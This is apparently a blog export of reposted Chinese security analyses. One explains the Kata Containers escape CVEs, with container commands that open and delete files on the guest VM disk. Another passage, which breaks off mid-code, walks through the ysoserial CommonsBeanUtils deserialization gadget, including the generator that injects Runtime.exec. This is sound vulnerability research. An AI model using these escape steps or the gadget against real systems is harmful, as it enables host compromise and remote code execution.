    <title>KataContainers安全容器逃逸-CVE-2020-2023/2024/2025/2026(转载上)</title>
    <url>/posts/3420123780/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>

<p>版权声明：本文为「星云实验室 绿盟科技研究通讯」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://mp.weixin.qq.com/s/q4xJtlO6iFpHQginGvVBDQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/q4xJtlO6iFpHQginGvVBDQ</a></p>
<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>在2020年Black hat北美会议上，来自Palo Alto Networks的高级安全研究员Yuval Avrahami分享了利用多个漏洞成功从Kata containers逃逸的议题[1]。</p>
<p>作为一种轻量级虚拟化技术，传统容器与宿主机共享内核，这意味着系统内核权限提升漏洞往往也可用来实施容器逃逸。为了彻底解决这一问题，在轻量与安全性之间达到较好的平衡，安全容器应运而生。Kata Containers是一种安全容器的具体实现，其他主流的安全容器还有Google推出的gVisor[4]等。</p>
<p>Kata Containers项目最初由Hyper.sh的runV项目与Intel的Clear Container合并而来，并于2017年开源[2]。它的核心思想是，为每一个容器运行一个独立虚拟机，从而避免其与宿主机共享内核。这样一来，即使攻击者在容器内部成功利用了内核漏洞攻破内核，他依然被限制在虚拟机内部，无法逃逸到宿主机上。Kata Containers在官方介绍中[3]直观地展示了它与传统容器之间的异同： </p>
<p><img src="/posts/3420123780/20210303143537.png" alt="20210303143537"></p>
<p>从上图可以得出结论，在不考虑其他因素的情况下，如果Kata Containers内部的攻击者想要逃逸到宿主机上，他必须至少经过两次逃逸——「容器逃逸」和「虚拟机逃逸」，才能达到目的。也就是说，单一的漏洞可能将不再奏效，攻击者需要构建一条漏洞利用链。</p>
<p>事实上，Yuval Avrahami也是这么做的。他分享的议题中一共涉及四个漏洞：</p>
<ol>
<li>CVE-2020-2023：Kata Containers容器不受限地访问虚拟机的根文件系统设备[5]，CVSS 3.x评分为6.3[11]；</li>
<li>CVE-2020-2024：Kata Containers运行时（runtime）在卸载（unmount）挂载点时存在符号链接解析漏洞，可能允许针对宿主机的拒绝服务攻击[6]，CVSS 3.x评分为6.5[12]；</li>
<li>CVE-2020-2025：基于Cloud Hypervisor的Kata Containers会将虚拟机文件系统的改动写入到虚拟机镜像文件（在宿主机上）[7]，CVSS 3.x评分为8.8[13]；</li>
<li>CVE-2020-2026：Kata Containers运行时在挂载（mount）容器根文件系统（rootfs）时存在符号链接解析漏洞，可能允许攻击者在宿主机上执行任意代码[8]，CVSS 3.x评分为8.8[14]。 </li>
</ol>
<p>其中，CVE-2020-2024主要会导致拒绝服务攻击，对逃逸帮助不大。逃逸主要依靠其他三个漏洞形成的利用链条来实现。</p>
<p>这个议题精彩又富有意义。它让我们意识到，即使是采用了独立内核的“安全容器”，也存在逃逸风险。换句话说，安全没有银弹。</p>
<p>本文将对该议题中的逃逸过程（Container-to-Host）及相关的三个漏洞进行详解和复现。 </p>
<p>注：</p>
<ul>
<li>相关漏洞在新版本Kata Containers中均已得到修复。</li>
<li>文中涉及到的是Kata Containers 1.x系列版本，2.x有所差异但相关度不大，不再涉及，感兴趣的读者可以参考官方文档[19]。</li>
<li>后文过程中使用的Kata Containers组件、源码版本如无特殊说明，均为1.10.0。 </li>
</ul>
<h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><h4 id="安全容器"><a href="#安全容器" class="headerlink" title="安全容器"></a><strong>安全容器</strong></h4><p>「安全容器」一词，是相对于传统容器而言的。作为一种虚拟化技术，虽然容器本身已经提供了一定程度上的隔离性，但这种隔离性时不时就会被打破。问题的根源在于，传统容器与宿主机共享内核，内核漏洞势必会直接影响容器的安全性。然而由于内核的复杂度过高等原因，近年来，高危内核漏洞层出不穷。</p>
<p>那么，为什么不直接使用虚拟机呢？答案很明显，性能和资源开销问题使得传统虚拟机技术在现今很多场景和开发部署模式下并不适用，而这也恰恰是容器技术流行的主要原因之一。因此，人们引入了安全容器，希望在轻量化和安全性上达到较好的平衡。</p>
<p>随着云原生技术和生态的发展，开源安全容器项目也在陆续增多。下面，我们介绍两种主流、目标一致但原理各异的安全容器项目：Kata Containers和gVisor。</p>
<p><strong>&gt;&gt;&gt;&gt;</strong></p>
<p><strong>Kata Containers</strong></p>
<p>在「简介」部分，我们已经概括了Kata Containers项目的诞生和原理相关信息，这里不再重复。我们来深入了解一下Kata Containers，这对后面的漏洞分析和利用有帮助。Kata Containers符合OCI运行时规范[18]，能够替换runC，与Docker引擎无缝对接，也支持Kubernetes。</p>
<p>下图[2]清晰展示了Kata Containers的组件及各自的角色位置： </p>
<p><img src="/posts/3420123780/20210303143611.png" alt="20210303143611"></p>
<p>我们来分别介绍一下各个组件及其作用：</p>
<ul>
<li>runtime：容器运行时，负责处理来自Docker引擎或Kubernetes等上层设施的命令（OCI规范定义）及启动kata-shim，程序名为kata-runtime。</li>
<li>agent：运行在虚拟机中，与runtime交互，用于管理容器及容器内进程，程序名为kata-agent。</li>
<li>proxy：负责宿主机与虚拟机之间的通信（对shim、runtime及agent之间的I/O流及信号进行路由），如果宿主机内核支持vsock，则proxy是非必要的，程序名为kata-proxy。</li>
<li>shim：容器进程收集器，用来监控容器进程并收集、转发I/O流及信号，程序名为kata-shim。</li>
<li>hypervisor：虚拟机监视器，负责虚拟机的创建、运行、销毁等管理，有多种选择，QEMU、Cloud Hypervisor等。</li>
<li>虚拟机：由高度优化过的内核和文件系统镜像文件创建而来，负责为容器提供一个更强的隔离环境。 </li>
</ul>
<p>欲了解更多关于Kata Containers的内容，可以参考官方文档[3][17]。</p>
<p><strong>&gt;&gt;&gt;&gt;</strong></p>
<p><strong>gVisor</strong></p>
<p>gVisor是由Google开源的一款安全容器，它在实现上与Kata Containers有明显不同。Kata Containers虽然同样避免了容器与宿主机共享内核，但它的思路是提供一个虚拟机，容器与虚拟机共享内核；而gVisor则直接在用户层实现了内核，用来拦截容器内程序对系统API的调用，处理并响应。</p>
<p>欲了解更多关于gVisor的内容，可以参考官方文档[20]。</p>
<p><strong>Cloud Hypervisor</strong> </p>
<p>Cloud Hypervisor是一个开源的虚拟机监视器（VMM），基于KVM运行。该项目专注于在受限硬件基础架构和平台上运行现代云计算工作流。它采用Rust语言实现，基于rust-vmm创建。</p>
<p>从1.10.0版本起，Kata Containers支持采用Cloud Hypervisor作为它的虚拟机监视器。</p>
<p>欲了解更多关于Cloud Hypervisor的内容，可以参考官方文档[16]。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>如「简介」部分所述，从容器到宿主机的逃逸涉及三个漏洞的使用，由「容器逃逸」和「虚拟机逃逸」两部分组成。</p>
<p>其中，容器逃逸涉及到的漏洞是CVE-2020-2023，虚拟机逃逸涉及到的漏洞是CVE-2020-2025和CVE-2020-2026。其中，前两个是权限控制的问题，最后一个漏洞则是云原生环境下的“常客”——未限制符号链接解析导致的文件系统逃逸问题，类似的漏洞还有CVE-2019-14271[21]等。 </p>
<p>下面我们分别进行简单分析。</p>
<p><strong>CVE-2020-2023</strong> </p>
<p>这个漏洞是典型的权限控制问题——容器内部可以访问并修改虚拟机的文件系统。其根源之一在于，Kata Containers并未通过Device Cgroup[21]限制容器对虚拟机设备的访问，因此容器能够通过创建设备文件的方式来访问到虚拟机设备。</p>
<p>创建设备文件需要用到mknod系统调用，而mknod需要Capabilities中的CAP_MKNOD权限[23]。那么容器是否拥有这个权限呢？不同引擎的规定不一定相同，但至少默认情况下Docker引擎是支持此权限的[24]： </p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// moby/oci/caps/defaults.go</span></span><br><span class="line"><span class="keyword">package</span> caps <span class="comment">// import "github.com/docker/docker/oci/caps"</span></span><br><span class="line"><span class="comment">// DefaultCapabilities returns a Linux kernel default capabilities</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DefaultCapabilities</span><span class="params">()</span> []<span class="title">string</span></span> {</span><br><span class="line">  <span class="keyword">return</span> []<span class="keyword">string</span>{</span><br><span class="line">    <span class="string">"CAP_CHOWN"</span>,</span><br><span class="line">    <span class="string">"CAP_DAC_OVERRIDE"</span>,</span><br><span class="line">    <span class="string">"CAP_FSETID"</span>,</span><br><span class="line">    <span class="string">"CAP_FOWNER"</span>,</span><br><span class="line">    <span class="string">"CAP_MKNOD"</span>, <span class="comment">// 容器有此权限！</span></span><br><span class="line">    <span class="string">"CAP_NET_RAW"</span>,</span><br><span class="line">    <span class="string">"CAP_SETGID"</span>,</span><br><span class="line">    <span class="string">"CAP_SETUID"</span>,</span><br><span class="line">    <span class="string">"CAP_SETFCAP"</span>,</span><br><span class="line">    <span class="string">"CAP_SETPCAP"</span>,</span><br><span class="line">    <span class="string">"CAP_NET_BIND_SERVICE"</span>,</span><br><span class="line">    <span class="string">"CAP_SYS_CHROOT"</span>,</span><br><span class="line">    <span class="string">"CAP_KILL"</span>,</span><br><span class="line">    <span class="string">"CAP_AUDIT_WRITE"</span>,</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>为了进一步确定，我们可以在Kata Containers创建的容器中来验证一下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">root#</span><span class="bash"> docker run --rm -it ubuntu /bin/bash</span></span><br><span class="line">root@df2cff910fdb:/# grep CapEff /proc/self/status</span><br><span class="line">CapEff:  00000000a80425fb</span><br><span class="line">root@df2cff910fdb:/# exit</span><br><span class="line">exit</span><br><span class="line"><span class="meta">root#</span><span class="bash"> capsh --decode=00000000a80425fb</span></span><br><span class="line">0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap</span><br></pre></td></tr></tbody></table></figure>

<p>首先从容器中/proc/self/status文件获取到Capabilities的具体值，然后对其进行解析。结果显示，容器确实拥有CAP_MKNOD权限。</p>
<p>既然如此，再结合CVE-2020-2023，我们进一步来尝试下能否在容器内通过创建设备文件来访问、甚至修改设备。</p>
<p>在存在漏洞的环境中（后文「逃逸复现-环境准备」小节给出了搭建漏洞环境的方法，读者可参考），创建一个容器；在容器内，首先我们需要找到底层虚拟机块设备的设备号，然后创建设备文件。 </p>
<p>/sys/dev/block/目录下是各种块设备的符号链接，文件名即为目标块设备的主次设备号，我们要找到目标块设备为vda1的符号链接文件名，从而获得主次设备号。</p>
<p>例如，在笔者的环境下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">root@7d30fe24da7e:/# ls -al /sys/dev/block/ | grep vda1</span><br><span class="line">lrwxrwxrwx 1 root root 0 Sep 23 03:16 254:1 -&gt; ../../devices/pci0000:00/0000:00:01.0/virtio0/block/vda/vda1</span><br></pre></td></tr></tbody></table></figure>

<p>找到主设备号为254，次设备号为1。在获取设备号后，即可使用mknod创建设备文件：</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">mknod --mode 0600 /dev/guest_hd b 254 1</span><br></pre></td></tr></tbody></table></figure>

<p>接着，就可以对该设备进行访问和操作了。这里我们可以借助debugfs工具来实现：</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">root@7d30fe24da7e:/# /sbin/debugfs -w /dev/guest_hd</span><br><span class="line">debugfs 1.45.5 (07-Jan-2020)</span><br><span class="line">debugfs:  ls</span><br><span class="line"> 2  (12) .    2  (12) ..    11  (20) lost+found    12  (16) autofs</span><br><span class="line"> 13  (12) bin    14  (12) boot    15  (12) dev    16  (12) etc</span><br><span class="line"> 21  (12) home    22  (12) lib    23  (16) lib64    24  (16) media</span><br><span class="line"> 25  (12) mnt    26  (12) proc    27  (12) root    28  (12) run</span><br><span class="line"> 29  (12) sbin    30  (12) srv    31  (12) sys    32  (12) tmp</span><br><span class="line"> 33  (12) usr    2061  (3824) var</span><br></pre></td></tr></tbody></table></figure>

<p>果然，漏洞存在时，我们的确能够访问虚拟机文件系统。那么，能否修改呢？可以的，例如，kata-agent就在usr/bin目录下：</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">debugfs:  cd usr/bin</span><br><span class="line">debugfs:  ls</span><br><span class="line"> 435  (12) .    33  (12) ..    436  (20) kata-agent    437  (16) ldconfig</span><br><span class="line"> 438  (16) chronyc    439  (16) chronyd    440  (16) capsh</span><br><span class="line"> 441  (16) getcap    442  (16) getpcaps    443  (16) setcap    444  (12) su</span><br><span class="line"> 445  (16) bootctl    446  (16) busctl    447  (20) coredumpctl</span><br></pre></td></tr></tbody></table></figure>

<p>我们可以直接删除它：</p>
<figure class="highlight shell"><table><tbody><tr><td class="code"><pre><span class="line">debugfs:  rm kata-agent</span><br><span class="line"></span><br><span class="line">debugfs:  ls</span><br><span class="line"> 435  (12) .    33  (32) ..    437  (16) ldconfig    438  (16) chronyc</span><br><span class="line"> 439  (16) chronyd    440  (16) capsh    441  (16) getcap</span><br><span class="line"> 442  (16) getpcaps    443  (16) setcap    444  (12) su    445  (16) bootctl</span><br><span class="line"> 446  (16) busctl    447  (20) coredumpctl    448  (12) halt</span><br></pre></td></tr></tbody></table></figure>

<p>可以看到，操作执行成功，kata-agent被删除了。 </p>
<p>我们能够修改文件系统，说明它以读写模式挂载，这是漏洞根源之二。</p>
<!--
<div class="poem-wrap">
  <div class="poem-border poem-left"></div>
  <div class="poem-border poem-right"></div>
    <h1>念两句诗</h1>
    <p id="poem">挑选中...</p>
    <p id="info">

  <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
  <script type="text/javascript">
    jinrishici.load(function(result) {
      poem.innerHTML = result.data.content
      info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》'
      document.getElementById("poem").value(poem);
      document.getElementById("info").value(info);  
  });
  </script>
</div>
-->

<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>容器逃逸</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>KataContainers容器</tag>
        <tag>CVE-2020-2023/2024/2025/2026</tag>
        <tag>容器逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-15257-containerd容器逃逸-&lt;1.3.9|1.4.3</title>
    <url>/posts/497175673/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>

<!--
<div class="poem-wrap">
  <div class="poem-border poem-left"></div>
  <div class="poem-border poem-right"></div>
    <h1>念两句诗</h1>
    <p id="poem">挑选中...</p>
    <p id="info">

  <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
  <script type="text/javascript">
    jinrishici.load(function(result) {
      poem.innerHTML = result.data.content
      info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》'
      document.getElementById("poem").value(poem);
      document.getElementById("info").value(info);  
  });
  </script>
</div>
-->

<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
  </entry>
  <entry>
    <title>Java反序列化之CommonsBeanUtils 分析（转载）</title>
    <url>/posts/1312971051/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>

<p><strong>Author: rungobier (知道创宇404安全实验室)</strong></p>
<p><strong>Date: 2016-03-04</strong></p>
<h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><p>前几天看到 github 上的 ysoserial 更新至0.0.4，增加了 CommonsBeanUtils 的Java反序列化 Payload 生成代码，原以为跟前面的 CommonsCollections 的原理一样，仔细看了一遍思路大不相同。CommonsBeanutilsCollectionsLogging1 主要依赖的 jar 包有：commons-collections(2.0-3.2.2), commons-beanutils-1.9.2, commons-loggings-1.2。</p>
<h3 id="二、序列化"><a href="#二、序列化" class="headerlink" title="二、序列化"></a>二、序列化</h3><p>CommonsBeanutilsCollectionsLogging1 的主要代码如下:</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">public Object getObject(final String command) throws Exception {</span><br><span class="line">	final TemplatesImpl templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line">	// mock method name until armed</span><br><span class="line">	final BeanComparator comparator = new BeanComparator("lowestSetBit");</span><br><span class="line"></span><br><span class="line">	// create queue with numbers and basic comparator</span><br><span class="line">	final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);</span><br><span class="line">	// stub data for replacement later</span><br><span class="line">	queue.add(new BigInteger("1"));</span><br><span class="line">	queue.add(new BigInteger("1"));</span><br><span class="line"></span><br><span class="line">	// switch method called by comparator</span><br><span class="line">	Reflections.setFieldValue(comparator, "property", "outputProperties");</span><br><span class="line"></span><br><span class="line">	// switch contents of queue</span><br><span class="line">	final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");</span><br><span class="line">	queueArray[0] = templates;</span><br><span class="line">	queueArray[1] = templates;</span><br><span class="line">	return queue;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>在 CommonsCollections 的 payload 生成过程当中，需要形成反序列化的调用链。刚开始我以为这个是 CommonsCollections 的更新升级版，特意追了下 commons-collections 的相关代码，发现 commons-collections 在这里只是起到辅助作用，仅在 BeanComparator 中用到了 ComparableComparator 这个类，追踪了下 ComparableComparator 的源代码，它从 commons-collections-2.0 就已经存在了，而且在最新版本的 commons-collections 也未做较大改动。</p>
<p>下面是 BeanComparator 的相关代码：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">package org.apache.commons.beanutils;</span><br><span class="line"></span><br><span class="line">import java.io.Serializable;</span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.util.Comparator;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.comparators.ComparableComparator;</span><br><span class="line">...</span><br><span class="line">public class BeanComparator&lt;T&gt; implements Comparator&lt;T&gt;, Serializable {</span><br><span class="line"></span><br><span class="line">    private String property;</span><br><span class="line">    private final Comparator&lt;?&gt; comparator;</span><br><span class="line">...</span><br><span class="line">    public BeanComparator( String property ) {</span><br><span class="line">        this( property, ComparableComparator.getInstance() );</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    public BeanComparator( String property, Comparator&lt;?&gt; comparator ) {</span><br><span class="line">        setProperty( property );</span><br><span class="line">        if (comparator != null) {</span><br><span class="line">            this.comparator = comparator;</span><br><span class="line">        } else {</span><br><span class="line">            this.comparator = ComparableComparator.getInstance();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>回归正题，在今天这个 payload 生成过程当中也需要形成反序列化的调用链，PriorityQueue 是符合这个条件的，其自身实现了 readObject。PriorityQueue 是使用数组实现的完全二叉树优先队列，不允许空值，而且不支持 non-comparable 的对象。在最终达到 Runtime.exec 之前，需要解决以下几个问题：</p>
<ul>
<li>放入PriorityQueue的对象需要实现readObject</li>
<li>要实现Comparable接口</li>
</ul>
<p>经过第一个条件的过滤之后，可以发现 jdk 中的 TemplatesImpl 类可以满足条件。</p>
<p>但是，TemplatesImpl 未实现 Comparable 接口，为了绕过这个，可以看到代码当中首先添加了两个 BigInteger 值为1的对象。BeanComparator 中设置的比较属性为 lowestSetBit，这里也可以改为 BigInteger 其它的可比较属性名称，前期分析过程当中原以为是为了在比较过程当中利用特定的属性触发某些条件，继续跟踪下去发现根本不是。</p>
<p>由于PriorityQuque的泛型类型设置为了Object，所以是任何实现了Comparable接口的对象都可以放进去的。那么不可比较的templates对象怎么处理？</p>
<p>首先，利用 Java 反射机制将 Comparator的property 设置为 TemplatesImpl 的属性 outputProperties，但是这个属性在这里未起到比较的作用。它的重要作用将在 payload 反序列化时体现。</p>
<p>其次，我们看到代码利用反射机制直接获取了 PriorityQueue 的内置属性数组 queue，将 templates 按照索引值填入了 queue，这样做是利用了 Java 的泛型的类型擦除，这里简单介绍下类型擦除，早期的 Java 语言是不支持泛型的，后来在Java5 当中加入了泛型支持，在 Java 编译阶段将具体的类型信息擦除了，所以在 Java 的泛型代码内部，是无法获得任何有关泛型参数类型的信息。这样就规避掉了条件二的限制，并且在序列化数据中保留了 templates 的类型信息，不得不说这段代码实现的非常精巧。</p>
<p>如果不做上述的处理，直接使用 queue.add 方法添加 templates,在生成 payload 时，将会触发 Java 的 SecurityManager 安全机制，抛出异常。</p>
<p>最后，这段代码中精心构造的 PriorityQueue 对象，包含的两个 TemplatesImpl 对象被序列化，相关被序列化的还有 BeanComparator 对象的属性 property ，它的值为 outputProperties。</p>
<p>下面我们看看对象 templates 的生成相关代码:</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">	static {</span><br><span class="line">		// special case for using TemplatesImpl gadgets with a SecurityManager enabled</span><br><span class="line">		System.setProperty(DESERIALIZE_TRANSLET, "true");</span><br><span class="line"></span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	public static class StubTransletPayload extends AbstractTranslet implements Serializable {</span><br><span class="line">		private static final long serialVersionUID = -5971610431559700674L;</span><br><span class="line"></span><br><span class="line">		public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}</span><br><span class="line"></span><br><span class="line">		@Override</span><br><span class="line">		public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	// required to make TemplatesImpl happy</span><br><span class="line">	public static class Foo implements Serializable {</span><br><span class="line">		private static final long serialVersionUID = 8207363842866235160L;</span><br><span class="line">	}</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">	public static TemplatesImpl createTemplatesImpl(final String command) throws Exception {</span><br><span class="line">		final TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line"></span><br><span class="line">		// use template gadget class</span><br><span class="line">		ClassPool pool = ClassPool.getDefault();</span><br><span class="line">		pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));</span><br><span class="line">		final CtClass clazz = pool.get(StubTransletPayload.class.getName());</span><br><span class="line">		// run command in static initializer</span><br><span class="line">		// TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span><br><span class="line">		clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") +"\");");</span><br><span class="line">		// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span><br><span class="line">		clazz.setName("ysoserial.Pwner" + System.nanoTime());</span><br><span class="line"></span><br><span class="line">		final byte[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">		// inject class bytes into instance</span><br><span class="line">		Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {</span><br><span class="line">			classBytes,</span><br><span class="line">			ClassFiles.classAsBytes(Foo.class)});</span><br><span class="line"></span><br><span class="line">		// required to make TemplatesImpl happy</span><br><span class="line">		Reflections.setFieldValue(templates, "_name", "Pwnr");</span><br><span class="line">		Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());</span><br><span class="line">		return templates;</span><br><span class="line">	}</span><br></pre></td></tr></tbody></table></figure>

<p>上述代码中的重点是利用了 Javaassist 这个动态代理库，这个库在我看来实现了 Java 当中的元编程，就是让 Java 代码在运行当中动态编写可以运行的代码。利用它为 TemplatesImpl 对象的属性 _bytecodes 填入了静态内置类 StubTransletPayload 的字节码，动态代理库在这个静态内置类的静态初始化方法中加入了需要执行的指令，一般都为<strong>Runtime.exec</strong> 。</p>
<h3 id="三、反序列化"><a href="#三、反序列化" class="headerlink" title="三、反序列化"></a>三、反序列化</h3><p>上面简单分解了序列化 payload 生成过程，这里将剖析反序列化的过程。</p>
<p>首先，我们看看 PriorityQueue的readObject() 函数调用过程:</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">        throws java.io.IOException, ClassNotFoundException {</span><br><span class="line">        // Read in size, and any hidden stuff</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        // Read in (and discard) array length</span><br><span class="line">        s.readInt();</span><br><span class="line"></span><br><span class="line">        queue = new Object[size];</span><br><span class="line"></span><br><span class="line">        // Read in all elements.</span><br><span class="line">        for (int i = 0; i &lt; size; i++)</span><br><span class="line">            queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">        // Elements are guaranteed to be in "proper order", but the</span><br><span class="line">        // spec has never explained what that might be.</span><br><span class="line">        heapify();</span><br><span class="line">		}</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line">	private void heapify() {</span><br><span class="line">        for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)</span><br><span class="line">            siftDown(i, (E) queue[i]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line">	private void siftDown(int k, E x) {</span><br><span class="line">        if (comparator != null)</span><br><span class="line">            siftDownUsingComparator(k, x);</span><br><span class="line">        else</span><br><span class="line">            siftDownComparable(k, x);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line">    private void siftDownUsingComparator(int k, E x) {</span><br><span class="line">        int half = size &gt;&gt;&gt; 1;</span><br><span class="line">        while (k &lt; half) {</span><br><span class="line">            int child = (k &lt;&lt; 1) + 1;</span><br><span class="line">            Object c = queue[child];</span><br><span class="line">            int right = child + 1;</span><br><span class="line">            if (right &lt; size &amp;&amp;</span><br><span class="line">                comparator.compare((E) c, (E) queue[right]) &gt; 0)</span><br><span class="line">                c = queue[child = right];</span><br><span class="line">            if (comparator.compare(x, (E) c) &lt;= 0)</span><br><span class="line">                break;</span><br><span class="line">            queue[k] = c;</span><br><span class="line">            k = child;</span><br><span class="line">        }</span><br><span class="line">        queue[k] = x;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>

<p>从上面的代码可以看出 PriorityQueue 在反序列化过程中对队列当中的元素做了比较排序，调用了 Comparator 进行元素比较。进一步跟进 BeanComparator 的 compare 方法:</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">  public int compare( T o1, T o2 ) {</span><br><span class="line">      if ( property == null ) {</span><br><span class="line">          // compare the actual objects</span><br><span class="line">          return internalCompare( o1, o2 );</span><br><span class="line">      }</span><br><span class="line"></span><br><span class="line">      try {</span><br><span class="line">          Object value1 = PropertyUtils.getProperty( o1, property );</span><br><span class="line">          Object value2 = PropertyUtils.getProperty( o2, property );</span><br><span class="line">          return internalCompare( value1, value2 );</span><br><span class="line">      }</span><br><span class="line">      catch ( IllegalAccessException iae ) {</span><br><span class="line">...</span><br><span class="line">      }</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure>

<p>使用了 PropertyUtils 类的 getPropety 方法，代码在这里就不贴了，其实就是调用了对象(templates) 的 Bean 方法(getOutputProperties)，而 TemplatesImpl 类的这个方法的具体内容就是关键的一句话 return newTransformer().getOutputProperties(); ， newTransformer 方法的后续关键代码如下:</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">    public int compare( T o1, T o2 ) {</span><br><span class="line">        if ( property == null ) {</span><br><span class="line">            // compare the actual objects</span><br><span class="line">            return internalCompare( o1, o2 );</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        try {</span><br><span class="line">            Object value1 = PropertyUtils.getProperty( o1, property );</span><br><span class="line">            Object value2 = PropertyUtils.getProperty( o2, property );</span><br><span class="line">            return internalCompare( value1, value2 );</span><br><span class="line">        }</span><br><span class="line">        catch ( IllegalAccessException iae ) {</span><br><span class="line">        ...</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    public synchronized Transformer newTransformer()</span><br><span class="line">        throws TransformerConfigurationException</span><br><span class="line">    {</span><br><span class="line">...</span><br><span class="line">        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">            _indentNumber, _tfactory);</span><br><span class="line">...</span><br><span class="line">    }</span><br><span class="line">...</span><br><span class="line">    private Translet getTransletInstance()</span><br><span class="line">        throws TransformerConfigurationException {</span><br><span class="line">        try {</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">            if (_class == null) defineTransletClasses();</span><br><span class="line">...</span><br><span class="line">        }</span><br><span class="line">...</span><br><span class="line">    }</span><br><span class="line">...</span><br><span class="line">    private void defineTransletClasses() throws TransformerConfigurationException {</span><br><span class="line">...</span><br><span class="line">        TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(new PrivilegedAction() 